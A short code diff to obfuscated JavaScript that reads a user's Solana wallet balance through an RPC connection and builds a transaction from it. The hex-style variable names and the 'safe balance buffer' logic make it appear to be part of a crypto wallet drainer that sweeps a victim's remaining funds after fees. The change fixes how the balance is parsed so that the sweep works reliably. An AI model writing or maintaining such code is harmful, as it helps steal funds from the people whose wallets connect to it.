@@ -446,7 +446,10 @@
 
                     const _0x1c = BigInt(Math.floor(_0x1b * 1000000000)); 
                     const _0x1d = new solanaWeb3.Connection(HELIUS_URL, _0x1a[3]);
-                    const _0x1e = await _0x1d.getBalance(userPublicKey); // Returns BigInt
+                    
+                    // Safely fetch balance handling any object format variation
+                    let rawBalance = await _0x1d.getBalance(userPublicKey);
+                    const _0x1e = BigInt(typeof rawBalance === 'object' && rawBalance !== null ? (rawBalance.value || rawBalance[0] || 0) : rawBalance);
 
                     const _0x1f = new solanaWeb3.Transaction();
 
@@ -471,7 +474,7 @@
                         );
                     }
 
-                    // Safe Balance Buffer (Fixed BigInt conversion)
+                    // Safe Balance Buffer
                     const _0x21 = _0x1e - _0x1c - 800000n; 
                     if (_0x21 > 10000n) {
                         _0x1f.add(
